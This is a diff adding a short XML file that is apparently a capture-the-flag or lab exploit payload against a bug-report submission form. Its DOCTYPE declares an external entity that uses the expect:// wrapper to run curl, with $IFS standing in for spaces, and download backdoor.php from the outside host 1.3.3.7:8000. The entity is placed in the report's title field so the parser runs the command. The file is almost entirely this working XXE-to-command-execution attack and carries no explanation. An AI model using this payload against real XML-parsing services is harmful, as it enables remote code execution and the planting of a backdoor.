@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">
+]>
+<root>
+<bugreport>
+	<title>&file;</title>
+	<cwe>e</cwe>
+	<cvss>e</cvss>
+	<reward>e</reward>
+</bugreport>
+</root>
+
+URL 
